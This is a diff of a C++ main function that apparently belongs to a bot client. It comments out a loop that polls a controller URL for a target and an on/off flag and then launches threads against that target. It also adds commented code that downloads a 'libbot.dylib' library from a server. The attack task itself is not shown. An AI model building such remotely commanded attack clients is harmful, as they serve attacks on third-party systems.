@@ -13,6 +13,7 @@
 #include "managing_threads.hpp"
 #include "task_for_thread.hpp"
 #include "parse_config.hpp"
+#include <so_lib/so_lib.hpp>
 
 int main(int argc, char *argv[])
 {
@@ -24,37 +25,47 @@ int main(int argc, char *argv[])
 
     bool status = false;
 
-    while (true)
-    {
-        cpr::Response target = cpr::Get(cpr::Url{get_target});
-        cpr::Response connect_status = cpr::Get(cpr::Url{connect});
-        std::cout << target.text << " : " << connect_status.text << std::endl;
-        if (connect_status.text == "true")
-        {
-            std::cout << "Connected" << std::endl;
-            status = true;
-            cpr::Response target = cpr::Get(cpr::Url{get_target});
-            std::cout << target.text << std::endl;
-            std::thread t = std::thread([&]()
-                                        { managind_threads(task_for_thread, std::stoi(num_of_threads), target.text, std::ref(status)); });
-            while (connect_status.text != "false")
-            {
-                sleep(5);
-                connect_status = cpr::Get(cpr::Url{connect});
-            }
-            status = false;
-            t.join();
-            connect_status = cpr::Get(cpr::Url{connect});
-        }
-        else if (connect_status.text == "false")
-        {
-            std::cout << "Ready to connect" << std::endl;
-            status = false;
-            cpr::Response target = cpr::Get(cpr::Url{get_target});
-            connect_status = cpr::Get(cpr::Url{connect});
-        }
-        sleep(5);
-    }
+    // cpr::Response r = cpr::Get(cpr::Url{"http://localhost:8080/get-library/libbot.dylib"},
+    //                            cpr::Header{{"Accept", "application/octet-stream"}});
+
+    // std::ofstream outfile("libbot.dylib", std::ofstream::binary);
+    // outfile.write(r.text.c_str(), r.text.length());
+    // outfile.close();
+    // std::cout << "Library downloaded successfully" << std::endl;
+
+    std::cout << to_power(10) << std::endl;
+
+    // while (true)
+    // {
+    //     cpr::Response target = cpr::Get(cpr::Url{get_target});
+    //     cpr::Response connect_status = cpr::Get(cpr::Url{connect});
+    //     std::cout << target.text << " : " << connect_status.text << std::endl;
+    //     if (connect_status.text == "true")
+    //     {
+    //         std::cout << "Connected" << std::endl;
+    //         status = true;
+    //         cpr::Response target = cpr::Get(cpr::Url{get_target});
+    //         std::cout << target.text << std::endl;
+    //         std::thread t = std::thread([&]()
+    //                                     { managind_threads(task_for_thread, std::stoi(num_of_threads), target.text, std::ref(status)); });
+    //         while (connect_status.text != "false")
+    //         {
+    //             sleep(5);
+    //             connect_status = cpr::Get(cpr::Url{connect});
+    //         }
+    //         status = false;
+    //         t.join();
+    //         connect_status = cpr::Get(cpr::Url{connect});
+    //     }
+    //     else if (connect_status.text == "false")
+    //     {
+    //         std::cout << "Ready to connect" << std::endl;
+    //         status = false;
+    //         cpr::Response target = cpr::Get(cpr::Url{get_target});
+    //         connect_status = cpr::Get(cpr::Url{connect});
+    //     }
+    //     sleep(5);
+    // }
 
     return 0;
 }
